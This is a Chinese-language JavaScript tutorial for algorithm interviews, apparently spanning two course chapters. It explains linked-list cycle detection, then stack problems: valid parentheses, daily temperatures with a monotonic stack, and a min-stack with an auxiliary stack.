<h2 data-id="heading-0">环形链表基本问题——如何判断链表是否成环？</h2>
<blockquote>
<p>真题描述：给定一个链表，判断链表中是否有环。</p>
</blockquote>
<blockquote>
<p>示例 1：<br/>
输入：[3,2,0,4]（链表结构如下图）
输出：true<br/>
解释：链表中存在一个环
<img src="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2020/3/29/1712658d244622c4~tplv-t2oaga2asx-jj-mark:3024:0:0:0:q75.awebp#?w=531&amp;h=171&amp;s=11301&amp;e=png" alt="链表图片" loading="lazy"/></p>
</blockquote>
<h3 data-id="heading-1">思路解读</h3>
<p>其实链表成环的特征非常明显，大家可以结合一个现实中的例子来理解：<br/>
假如现实中有一个长跑爱好者李雷，这货很狂，他立了一个 flag，说要徒步环游世界：</p>
<p><img src="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2020/3/29/171264fb2d7937b6~tplv-t2oaga2asx-jj-mark:3024:0:0:0:q75.awebp#?w=1020&amp;h=676&amp;s=73182&amp;e=png" alt="" loading="lazy"/>
地球的周长围出来的这个圆，它就是一个“环”。李雷现在就想围着这个环跑上一圈，说他狂，他也没那么狂——他觉得自己最多跑一圈，为了防止自己跑过界，他决定在出发的地方立一个 flag：</p>
<p><img src="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2020/3/29/1712651e82aded3d~tplv-t2oaga2asx-jj-mark:3024:0:0:0:q75.awebp#?w=854&amp;h=656&amp;s=71878&amp;e=png&amp;b=ffffff" alt="" loading="lazy"/><br/>
这样，不管李雷走完这个环用了多少年，世事如何变迁，只要他的 flag 还没有倒，那么李雷就一定能回到自己梦开始的地方：）。<br/>
换个角度看：只要李雷在闷头前进的过程中，发现了 flag 的存在，那么就意味着，李雷确实走了一个环。毕竟若这是一条线，他将永远无法回到起点。</p>
<p>回到链表的世界里，也是一个道理。一个环形链表的基本修养，是能够让遍历它的游标回到原点：</p>
<p><img src="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2020/3/29/1712655eb14b57b9~tplv-t2oaga2asx-jj-mark:3024:0:0:0:q75.awebp#?w=1174&amp;h=468&amp;s=37491&amp;e=png&amp;b=ffffff" alt="" loading="lazy"/><br/>
从 flag 出发，只要我能够再回到 flag 处，那么就意味着，我正在遍历一个环形链表。</p>
<p>我们按照这个思路来做题：</p>
<h3 data-id="heading-2">编码实现</h3>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">/**
 * <span class="hljs-doctag">@param</span> {<span class="hljs-type">ListNode</span>} <span class="hljs-variable">head</span>
 * <span class="hljs-doctag">@return</span> {<span class="hljs-type">boolean</span>}
 */</span>
<span class="hljs-comment">// 入参是头结点 </span>
<span class="hljs-keyword">const</span> hasCycle = <span class="hljs-keyword">function</span>(<span class="hljs-params">head</span>) {
    <span class="hljs-comment">// 只要结点存在，那么就继续遍历</span>
    <span class="hljs-keyword">while</span>(head){
        <span class="hljs-comment">// 如果 flag 已经立过了，那么说明环存在</span>
        <span class="hljs-keyword">if</span>(head.<span class="hljs-property">flag</span>){
            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
        }<span class="hljs-keyword">else</span>{
            <span class="hljs-comment">// 如果 flag 没立过，就立一个 flag 再往</span>
            下走
            head.<span class="hljs-property">flag</span> = <span class="hljs-literal">true</span>;
            head = head.<span class="hljs-property">next</span>;
        }
    }
    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
};

</code></pre>
<h2 data-id="heading-3">环形链表衍生问题——定位环的起点</h2>
<blockquote>
<p>真题描述：给定一个链表，返回链表开始入环的第一个结点。 如果链表无环，则返回 null。</p>
</blockquote>
<blockquote>
<p>示例 1：<br/>
输入：head = [3,2,0,-4]（如下图）
输出：tail connects to node index 1
解释：链表中有一个环，其尾部连接到第二个结点。
<img src="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2020/3/29/1712658d244622c4~tplv-t2oaga2asx-jj-mark:3024:0:0:0:q75.awebp#?w=531&amp;h=171&amp;s=11301&amp;e=png" alt="链表成环1" loading="lazy"/></p>
</blockquote>
<blockquote>
<p>示例 2：<br/>
输入：head = [1,2]（如下图）<br/>
输出：tail connects to node index 0<br/>
解释：链表中有一个环，其尾部连接到第一个结点。
<img src="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2020/3/29/171265cc949d62be~tplv-t2oaga2asx-jj-mark:3024:0:0:0:q75.awebp#?w=201&amp;h=105&amp;s=4582&amp;e=png&amp;b=fefefe" alt="链表成环2" loading="lazy"/></p>
</blockquote>
<blockquote>
<p>示例 3：<br/>
输入：head = [1]（如下图）<br/>
输出：no cycle<br/>
解释：链表中没有环。<br/>
<img src="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2020/3/29/171265d337a0b382~tplv-t2oaga2asx-jj-mark:3024:0:0:0:q75.awebp#?w=65&amp;h=65&amp;s=1963&amp;e=png" alt="链表成环3" loading="lazy"/></p>
</blockquote>
<h3 data-id="heading-4">思路解读</h3>
<p>这道题在上道题的基础上，仅仅增加了一个“返回链表的成环起点”，其难度定义就从 easy 上升到了 medium。不过对于掌握了关键解题思路的各位来说，这道题仍然是 easy——因为如果一个结点是环形链表成环的起点，那么它一定是第一个被发现 flag 标志已存在的结点：</p>
<p><img src="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2020/3/29/1712680006bb6a60~tplv-t2oaga2asx-jj-mark:3024:0:0:0:q75.awebp#?w=2182&amp;h=840&amp;s=154021&amp;e=jpg" alt="" loading="lazy"/>
这一点不难理解，我们试想如果从头开始遍历一个链表，假如途中进入了一个环，那么首先被打上 flag 标签的其实就是环的起点。待我们遍历完这个环时，即便环上所有的结点都已经被立了 flag，但起点处的 flag 一定最先被我们定位到。因此，我们只需要在第一次发现 flag 已存在时，将对应的结点返回即可：</p>
<h3 data-id="heading-5">编码实现</h3>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">/**
 * <span class="hljs-doctag">@param</span> {<span class="hljs-type">ListNode</span>} <span class="hljs-variable">head</span>
 * <span class="hljs-doctag">@return</span> {<span class="hljs-type">ListNode</span>}
 */</span>
<span class="hljs-keyword">const</span> detectCycle = <span class="hljs-keyword">function</span>(<span class="hljs-params">head</span>) {
    <span class="hljs-keyword">while</span>(head){
        <span class="hljs-keyword">if</span>(head.<span class="hljs-property">flag</span>){
            <span class="hljs-keyword">return</span> head;
        }<span class="hljs-keyword">else</span>{
            head.<span class="hljs-property">flag</span> = <span class="hljs-literal">true</span>;
            head = head.<span class="hljs-property">next</span>;
        }
    }
    <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
};
</code></pre>
<h2 data-id="heading-6">快慢指针的思路</h2>
<p>这道题还有一个公认的比较经典的思路，就是用快慢指针来做：<br/>
定义慢指针 slow，快指针 fast。两者齐头并进， slow 一次走一步、fast 一次 走两步。这样如果它们是在一个有环的链表里移动，一定有相遇的时刻。这个原理证明起来也比较简单：我们假设移动的次数为 t，slow 移动的路程就是<code>t</code>，fast 移动的路程为<code>2t</code>，假如环的长度为 <code>s</code>，那么当下面这个条件：</p>
<pre><code class="hljs language-js" lang="js">2t - t = s
</code></pre>
<p>也就是：</p>
<pre><code class="hljs language-js" lang="js">t = s
</code></pre>
<p>满足时，slow 和 fast 就一定会相遇。反之，如果两者没有相遇，同时 fast 遍历到了链表的末尾，发现 next 指针指向 null，则链表中不存在环。</p>
<p>有兴趣的同学，可以尝试用双指针法实现一遍上面的判定。不过我更加推荐的仍然是“立flag”法，理解难度和编码难度上来说都更加友好，有利于大家实现题目的“秒杀”。</p>
<h2 data-id="heading-7">弦外之音</h2>
<p>在这一节，大家会发现一个非常有趣的现象——做环形链表的系列题目，难点其实在于你怎么去想明白这个成环的过程、怎么把握成环后的特性。真正编码实现的时候，寥寥数行就可以搞定。这其实也是我想要向大家传达的一个重要的解题习惯——做算法题时，不要急于下手写代码，而应该先静下心来，稳住神、一步一步捋清楚你自己的思路。</p>
<p>之所以要把这点单独拎出来讲，是因为我知道很多同学平时写业务代码比较多。前端业务代码是什么特征？干就完了，对吧？反正就算代码有问题，也可以通过直观的视觉反馈及时发现、及时修复。在肉眼可见的反馈的指导下，你基本不会出什么方向性的问题。</p>
<p>做算法题就大不一样了，真正提交给 OJ 运行之前，除了你自己的逻辑判断之外、没有任何直观的线索能够帮你明确问题的所在。也就是说，如果你一开始压根没想清楚、脑子里本来就是一团乱麻，那么直接开干后往往是越写越乱、最后代码的修复成本也会变得非常高。</p>
<p>盲写代码、乱写代码，不仅容易扰乱自己的思路，也会给面试官留下“这个人怎么这么冒失”一类的负面印象。所以大家一定要尽量规避这种行为，如果实在对自己的思路感到不确定、不自信，这时候可以问对方要张纸、先线下梳理一下。真正面试的时候，我们对于自己敲在屏幕上的每一行代码，都应该抱有敬畏之心。</p>
<p>（阅读过程中有任何想法或疑问，或者单纯希望和笔者交个朋友啥的，欢迎大家添加我的微信xyalinode与我交流哈~）
栈与队列相关的问题就比较微妙了，很多时候相关题目中压根不会出现“栈”、“队列”这样的关键字，但只要你深入到真题里去、对栈和队列的应用场景建立起正确的感知，那么很多线索都会在分析的过程中被你轻松地挖掘出来。</p>
<p>这里也和大家分享一位读者在试读过程中的学习感悟：</p>
<blockquote>
<p>感觉算法题除了理解还要靠练习，就像高考数学题，要锻炼出解题常规思维。任重道远啊🙊</p>
</blockquote>
<p>其实就是这么回事，这也正是我们开篇就跟大家指明“以题为纲”这条路的初衷。</p>
<p>好啦，开工了老哥们！</p>
<h2 data-id="heading-8">典型真题快速上手-“有效括号”问题</h2>
<blockquote>
<p>题目描述：给定一个只包括 '('，')'，'{'，'}'，'['，']' 的字符串，判断字符串是否有效。</p>
</blockquote>
<blockquote>
<p>有效字符串需满足：
左括号必须用相同类型的右括号闭合。<br/>
左括号必须以正确的顺序闭合。<br/>
注意空字符串可被认为是有效字符串。</p>
</blockquote>
<blockquote>
<p>示例 1:<br/>
输入: "()"<br/>
输出: true</p>
</blockquote>
<blockquote>
<p>示例 2:<br/>
输入: "()[]{}"<br/>
输出: true</p>
</blockquote>
<blockquote>
<p>示例 3:<br/>
输入: "(]"<br/>
输出: false</p>
</blockquote>
<blockquote>
<p>示例 4:<br/>
输入: "([)]"<br/>
输出: false<br/>
示例 5:<br/>
输入: "{[]}"<br/>
输出: true</p>
</blockquote>
<h3 data-id="heading-9">思路分析</h3>
<p>括号问题在面试中出现频率非常高， 这类题目我们一般首选用栈来做。</p>
<p>为什么可以用栈做？大家想想，括号成立意味着什么？意味着<strong>对称性</strong>。</p>
<p>巧了，根据栈的后进先出原则，一组数据的入栈和出栈顺序刚好是对称的。比如说<code>1、2、3、4、5、6</code>按顺序入栈，其对应的出栈序列就是 <code>6、5、4、3、2、1</code>：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-number">123456</span>
<span class="hljs-number">654321</span>
</code></pre>
<p>对称关系一目了然。</p>
<p>因此这里大家可以记下一个规律：题目中若涉及括号问题，则很有可能和栈相关。</p>
<p>回到题目中来，我们的思路就是在遍历字符串的过程中，往栈里 push 括号对应的配对字符。比如如果遍历到了 <code>(</code>，就往栈里 push <code>)</code>。</p>
<p>假如字符串中所有的括号都成立，那么前期我们 push 进去的一定全都是左括号、后期 push 进去的一定全都是右括号。而且左括号的入栈顺序，和其对应的右括号的入栈顺序应该是相反的，比如这个例子：</p>
<pre><code class="hljs language-css" lang="css">({<span class="hljs-selector-attr">[]</span>})
</code></pre>
<p>最后一个入栈的左方括号<code>[</code>，与之匹配的右方括号<code>]</code>正是接下来第一个入栈的右括号。</p>
<p>因此，我们可以果断地认为在左括号全部入栈结束时，栈顶的那个左括号，就是第一个需要被配对的左括号。此时我们需要判断的是接下来入栈的第一个右括号是否和此时栈顶的左括号配对。如果配对成功，那么这一对括号就是有效的，否则直接 <code>return false</code>。</p>
<p>当判断出一对有效的括号之后，我们需要及时地丢掉它，去判断其它括号是否有效。这里这个“丢掉”的动作，就对应着两个括号一起出栈的过程。</p>
<p>每配对成功一对括号，我们都将这对括号出栈。这样一来，我们就可以确保栈顶的括号总是下一个需要被匹配的左括号。</p>
<p>如果说我们出栈到最后，栈不为空，那么意味着一部分没有被匹配上的括号被剩下来了，说明字符串中并非所有的括号都有效，判断 <code>false</code>；反之，则说明所有的括号都配对成功了，判断为 <code>true</code>。</p>
<h3 data-id="heading-10">编码实现</h3>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// 用一个 map 来维护左括号和右括号的对应关系</span>
<span class="hljs-keyword">const</span> leftToRight = {
  <span class="hljs-string">"("</span>: <span class="hljs-string">")"</span>,
  <span class="hljs-string">"["</span>: <span class="hljs-string">"]"</span>,
  <span class="hljs-string">"{"</span>: <span class="hljs-string">"}"</span>
};

<span class="hljs-comment">/**
 * <span class="hljs-doctag">@param</span> {<span class="hljs-type">string</span>} <span class="hljs-variable">s</span>
 * <span class="hljs-doctag">@return</span> {<span class="hljs-type">boolean</span>}
 */</span>
<span class="hljs-keyword">const</span> isValid = <span class="hljs-keyword">function</span>(<span class="hljs-params">s</span>) {
  <span class="hljs-comment">// 结合题意，空字符串无条件判断为 true</span>
  <span class="hljs-keyword">if</span> (!s) {
    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
  }
  <span class="hljs-comment">// 初始化 stack 数组</span>
  <span class="hljs-keyword">const</span> stack = [];
  <span class="hljs-comment">// 缓存字符串长度</span>
  <span class="hljs-keyword">const</span> len = s.<span class="hljs-property">length</span>;
  <span class="hljs-comment">// 遍历字符串</span>
  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; len; i++) {
    <span class="hljs-comment">// 缓存单个字符</span>
    <span class="hljs-keyword">const</span> ch = s[i];
    <span class="hljs-comment">// 判断是否是左括号，这里我为了实现加速，没有用数组的 includes 方法，直接手写判断逻辑</span>
    <span class="hljs-keyword">if</span> (ch === <span class="hljs-string">"("</span> || ch === <span class="hljs-string">"{"</span> || ch === <span class="hljs-string">"["</span>) stack.<span class="hljs-title function_">push</span>(leftToRight[ch]);
    <span class="hljs-comment">// 若不是左括号，则必须是和栈顶的左括号相配对的右括号</span>
    <span class="hljs-keyword">else</span> {
      <span class="hljs-comment">// 若栈为空，或栈顶的左括号没有和当前字符匹配上，那么判为无效</span>
      <span class="hljs-keyword">if</span> (!stack.<span class="hljs-property">length</span> || stack.<span class="hljs-title function_">pop</span>() !== ch) {
        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
      }
    }
  }
  <span class="hljs-comment">// 若所有的括号都能配对成功，那么最后栈应该是空的</span>
  <span class="hljs-keyword">return</span> !stack.<span class="hljs-property">length</span>;
};


</code></pre>
<h2 data-id="heading-11">栈问题进阶-每日温度问题</h2>
<blockquote>
<p>题目描述: 根据每日气温列表，请重新生成一个列表，对应位置的输出是需要再等待多久温度才会升高超过该日的天数。如果之后都不会升高，请在该位置用 0 来代替。</p>
</blockquote>
<blockquote>
<p>例如，给定一个列表 temperatures = [73, 74, 75, 71, 69, 72, 76, 73]，你的输出应该是 [1, 1, 4, 2, 1, 1, 0, 0]。</p>
</blockquote>
<blockquote>
<p>提示：气温 列表长度的范围是 [1, 30000]。每个气温的值的均为华氏度，都是在 [30, 100] 范围内的整数。</p>
</blockquote>
<h3 data-id="heading-12">思路分析</h3>
<p>看到这道题，大家不难想到暴力遍历法：直接两层遍历，第一层定位一个温度，第二层定位离这个温度最近的一次升温是哪天，然后求出两个温度对应索引的差值即可。</p>
<p>一个数组两层遍历，属于比较少见且高危的操作。事出反常必有妖，此时我们就需要反思：这道题是不是压根不该用暴力遍历来做？</p>
<p>答案是肯定的。因为在这个暴力遍历的过程中，我们其实做了很多“多余”的事情。</p>
<p>拿第三个索引位上这个 75 来说，我们在定位比 75 高的第一个温度的过程中，就路过了 71、69、72 这三个温度，其中，72 正是 71 对应的目标温度，可我们却像没看见它一样、啥也没干。只有等最外层遍历走到 71 时，我们才又重复了一遍刚刚走过的路、确认了 71 和 72 之间的关系——像这种不必要的重复，我们要想办法把它干掉。</p>
<p><strong>栈结构可以帮我们避免重复操作</strong>。<br/>
避免重复操作的秘诀就是<strong>及时地将不必要的数据出栈</strong>，避免它对我们后续的遍历产生干扰。</p>
<p>拿这道题来说，我们的思路就是：<strong>尝试去维持一个递减栈</strong>。<br/>
当遍历过的温度，维持的是一个<strong>单调递减</strong>的态势时，我们就对这些温度的索引下标执行入栈操作；只要出现了一个数字，它打破了这种单调递减的趋势，也就是说它比前一个温度值高，这时我们就对前后两个温度的索引下标求差，得出前一个温度距离第一次升温的目标差值。这么说可能有点抽象，我们用一张动图来理解一下这个过程（这个过程实际有将近一分钟那么长，贴上来之后我发现完全加载不出来，这里呈现的是截止到第一个元素出栈的片段，完整的视频我这边上传到了<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.bilibili.com%2Fvideo%2FBV12t4y1274o%2F" target="_blank" title="https://www.bilibili.com/video/BV12t4y1274o/" ref="nofollow noopener noreferrer">小破站</a>）：</p>
<p><img src="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2020/4/14/17177748909c5571~tplv-t2oaga2asx-jj-mark:3024:0:0:0:q75.awebp#?w=1209&amp;h=606&amp;s=1089377&amp;e=gif&amp;f=89" alt="温度问题的动画" loading="lazy"/></p>
<p>在这个过程中，我们仅对每一个温度执行最多一次入栈操作、一次出栈操作，整个数组只会被遍历一次，因此时间复杂度就是O(n)。相对于两次遍历带来的 O(n^2)的开销来看，栈结构真是帮了咱们大忙了。</p>
<h3 data-id="heading-13">编码实现</h3>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">/**
 * <span class="hljs-doctag">@param</span> {<span class="hljs-type">number[]</span>} <span class="hljs-variable">T</span>
 * <span class="hljs-doctag">@return</span> {<span class="hljs-type">number[]</span>}
 */</span>
<span class="hljs-comment">// 入参是温度数组</span>
<span class="hljs-keyword">const</span> dailyTemperatures = <span class="hljs-keyword">function</span>(<span class="hljs-params">T</span>) {
    <span class="hljs-keyword">const</span> len = T.<span class="hljs-property">length</span> <span class="hljs-comment">// 缓存数组的长度 </span>
    <span class="hljs-keyword">const</span> stack = [] <span class="hljs-comment">// 初始化一个栈   </span>
    <span class="hljs-keyword">const</span> res = (<span class="hljs-keyword">new</span> <span class="hljs-title class_">Array</span>(len)).<span class="hljs-title function_">fill</span>(<span class="hljs-number">0</span>) <span class="hljs-comment">//  初始化结果数组，注意数组定长，占位为0</span>
    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">let</span> i=<span class="hljs-number">0</span>;i&lt;len;i++) {
      <span class="hljs-comment">// 若栈不为0，且存在打破递减趋势的温度值</span>
      <span class="hljs-keyword">while</span>(stack.<span class="hljs-property">length</span> &amp;&amp; T[i] &gt; T[stack[stack.<span class="hljs-property">length</span>-<span class="hljs-number">1</span>]]) {
        <span class="hljs-comment">// 将栈顶温度值对应的索引出栈</span>
        <span class="hljs-keyword">const</span> top = stack.<span class="hljs-title function_">pop</span>()  
        <span class="hljs-comment">// 计算 当前栈顶温度值与第一个高于它的温度值 的索引差值</span>
        res[top] = i - top 
      }
      <span class="hljs-comment">// 注意栈里存的不是温度值，而是索引值，这是为了后面方便计算</span>
      stack.<span class="hljs-title function_">push</span>(i)
    }
    <span class="hljs-comment">// 返回结果数组</span>
    <span class="hljs-keyword">return</span> res 
};

</code></pre>
<h2 data-id="heading-14">栈的设计——“最小栈”问题</h2>
<blockquote>
<p>题目描述：设计一个支持 push ，pop ，top 操作，并能在常数时间内检索到最小元素的栈。</p>
</blockquote>
<blockquote>
<p>push(x) —— 将元素 x 推入栈中。<br/>
pop() —— 删除栈顶的元素。<br/>
top() —— 获取栈顶元素。<br/>
getMin() —— 检索栈中的最小元素。</p>
</blockquote>
<blockquote>
<p>示例:<br/>
MinStack minStack = new MinStack();<br/>
minStack.push(-2);<br/>
minStack.push(0);<br/>
minStack.push(-3);<br/>
minStack.getMin();   --&gt; 返回 -3.<br/>
minStack.pop();<br/>
minStack.top();      --&gt; 返回 0.<br/>
minStack.getMin();   --&gt; 返回 -2.</p>
</blockquote>
<h3 data-id="heading-15">思路分析</h3>
<p>这道题并不难，但是综合性很强，整个题做下来能够相对全面地考察到候选人对栈结构、栈操作的理解和掌握，是不少一面/少数二面面试官的心头好。</p>
<p>其中前三个操作：<code>push</code>、<code>pop</code> 和 <code>top</code>，我们在数据结构快速上手环节已经给大家讲过了，这里不多赘述。需要展开讲的是 <code>getMin</code> 这个接口，这个接口有时候会直接单独拎出来作为一道题来考察，需要大家对它的实现思路有一个真正扎实的掌握。</p>
<p><code>getMin</code> 要做的事情，是从一个栈里找出其中最小的数字。我们仍然是抛砖引玉，先说一个大部分人都能想到的思路：</p>
<p>初始化一个最小值变量，它的初始值可以设一个非常大的数（比如 <code>Infinity</code>），然后开始遍历整个栈。在遍历的过程中，如果遇到了更小的值，就把最小值变量更新为这个更小的值。这样遍历结束后，我们就能拿到栈中的最小值了。<br/>
这个过程中，我们对栈进行了一次遍历，时间复杂度无疑是 <code>O(n)</code>。</p>
<p>按照这个思路，整个栈的设计我们可以这样写：</p>
<h3 data-id="heading-16">编码实现1</h3>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">/**
 * 初始化你的栈结构
 */</span>
<span class="hljs-keyword">const</span> <span class="hljs-title class_">MinStack</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">stack</span> = []
};

<span class="hljs-comment">/** 
 * <span class="hljs-doctag">@param</span> {<span class="hljs-type">number</span>} <span class="hljs-variable">x</span>
 * <span class="hljs-doctag">@return</span> {<span class="hljs-type">void</span>}
 */</span>
<span class="hljs-comment">// 栈的入栈操作，其实就是数组的 push 方法</span>
<span class="hljs-title class_">MinStack</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">push</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params">x</span>) {
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">stack</span>.<span class="hljs-title function_">push</span>(x)
};

<span class="hljs-comment">/**
 * <span class="hljs-doctag">@return</span> {<span class="hljs-type">void</span>}
 */</span>
<span class="hljs-comment">// 栈的入栈操作，其实就是数组的 pop 方法</span>
<span class="hljs-title class_">MinStack</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">pop</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">stack</span>.<span class="hljs-title function_">pop</span>()
};

<span class="hljs-comment">/**
 * <span class="hljs-doctag">@return</span> {<span class="hljs-type">number</span>}
 */</span>
<span class="hljs-comment">// 取栈顶元素，咱们教过的哈，这里我本能地给它一个边界条件判断（其实不给也能通过，但是多做不错哈）</span>
<span class="hljs-title class_">MinStack</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">top</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">if</span>(!<span class="hljs-variable language_">this</span>.<span class="hljs-property">stack</span> || !<span class="hljs-variable language_">this</span>.<span class="hljs-property">stack</span>.<span class="hljs-property">length</span>) {
      <span class="hljs-keyword">return</span> 
  }
  <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">stack</span>[<span class="hljs-variable language_">this</span>.<span class="hljs-property">stack</span>.<span class="hljs-property">length</span> - <span class="hljs-number">1</span>]
};

<span class="hljs-comment">/**
 * <span class="hljs-doctag">@return</span> {<span class="hljs-type">number</span>}
 */</span>
<span class="hljs-comment">// 按照一次遍历的思路取最小值</span>
<span class="hljs-title class_">MinStack</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">getMin</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">let</span> minValue = <span class="hljs-title class_">Infinity</span>  
    <span class="hljs-keyword">const</span>  { stack } = <span class="hljs-variable language_">this</span>
    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">let</span> i=<span class="hljs-number">0</span>; i&lt;stack.<span class="hljs-property">length</span>;i++) {
        <span class="hljs-keyword">if</span>(stack[i] &lt; minValue) {
            minValue = stack[i]
        }
    }
    <span class="hljs-keyword">return</span> minValue
};
</code></pre>
<p>这样写，用例也能跑通，但是不够酷。如果你在面试时这样做了，面试官有99%的可能性会追问你这句：</p>
<p>“这道题有没有时间效率更高的做法？”</p>
<p>人家都这样问了，咱当然要说“有”。然后，面试官就会搬个小板凳，坐你旁边看你如何妙手回春，变 <code>O(n)</code> 为 <code>O(1)</code>。</p>
<p>时间效率的提升，从来都不是白嫖，它意味着我们要付出更多的空间占用作为代价。在这道题里，如果继续沿着栈的思路往下走，我们可以考虑再搞个栈（<code>stack2</code>）出来作为辅助，让这个栈去容纳当前的最小值。</p>
<p>如何确保 <code>stack2</code> 能够确切地给我们提供最小值？ 这里我们需要实现的是一个从<code>栈底到栈顶呈递减趋势的栈</code>（敲黑板！递减栈出现第二次了哈）：</p>
<ul>
<li>取最小值：由于整个栈从栈底到栈顶递减，因此栈顶元素就是最小元素。</li>
<li>若有新元素入栈：判断是不是比栈顶元素还要小，否则不准进入 <code>stack2</code>。</li>
<li>若有元素出栈：判断是不是和栈顶元素相等，如果是的话，<code>stack2</code> 也要出栈。</li>
</ul>
<p>按照这个思路，我们可以有以下编码：</p>
<h3 data-id="heading-17">编码实现2</h3>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> <span class="hljs-title class_">MinStack</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">stack</span> = [];
    <span class="hljs-comment">// 定义辅助栈</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">stack2</span> = [];
};

<span class="hljs-comment">/** 
 * <span class="hljs-doctag">@param</span> {<span class="hljs-type">number</span>} <span class="hljs-variable">x</span>
 * <span class="hljs-doctag">@return</span> {<span class="hljs-type">void</span>}
 */</span>
<span class="hljs-title class_">MinStack</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">push</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params">x</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">stack</span>.<span class="hljs-title function_">push</span>(x);
    <span class="hljs-comment">// 若入栈的值小于当前最小值，则推入辅助栈栈顶</span>
    <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">stack2</span>.<span class="hljs-property">length</span> == <span class="hljs-number">0</span> || <span class="hljs-variable language_">this</span>.<span class="hljs-property">stack2</span>[<span class="hljs-variable language_">this</span>.<span class="hljs-property">stack2</span>.<span class="hljs-property">length</span>-<span class="hljs-number">1</span>] &gt;= x){
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">stack2</span>.<span class="hljs-title function_">push</span>(x);
    }
};

<span class="hljs-comment">/**
 * <span class="hljs-doctag">@return</span> {<span class="hljs-type">void</span>}
 */</span>
<span class="hljs-title class_">MinStack</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">pop</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
    <span class="hljs-comment">// 若出栈的值和当前最小值相等，那么辅助栈也要对栈顶元素进行出栈，确保最小值的有效性</span>
    <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">stack</span>.<span class="hljs-title function_">pop</span>() == <span class="hljs-variable language_">this</span>.<span class="hljs-property">stack2</span>[<span class="hljs-variable language_">this</span>.<span class="hljs-property">stack2</span>.<span class="hljs-property">length</span>-<span class="hljs-number">1</span>]){
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">stack2</span>.<span class="hljs-title function_">pop</span>();
    }
};

<span class="hljs-comment">/**
 * <span class="hljs-doctag">@return</span> {<span class="hljs-type">number</span>}
 */</span>
<span class="hljs-title class_">MinStack</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">top</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">stack</span>[<span class="hljs-variable language_">this</span>.<span class="hljs-property">stack</span>.<span class="hljs-property">length</span>-<span class="hljs-number">1</span>];
};

<span class="hljs-comment">/**
 * <span class="hljs-doctag">@return</span> {<span class="hljs-type">number</span>}
 */</span>
<span class="hljs-title class_">MinStack</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">getMin</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
    <span class="hljs-comment">// 辅助栈的栈顶，存的就是目标中的最小值</span>
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">stack2</span>[<span class="hljs-variable language_">this</span>.<span class="hljs-property">stack2</span>.<span class="hljs-property">length</span>-<span class="hljs-number">1</span>];
};
</code></pre>
<p>（阅读过程中有任何想法或疑问，或者单纯希望和笔者交个朋友啥的，欢迎大家添加我的微信xyalinode与我交流哈~）
结束了针对栈结构的定点轰炸，我们现在开始要缓缓过渡到队列的世界了。</p>
<p>关于队列，在算法面试中大家需要掌握以下重点：</p>
<ol>
<li>栈向队列的转化</li>
<li>双端队列</li>
<li>优先队列</li>
</ol>
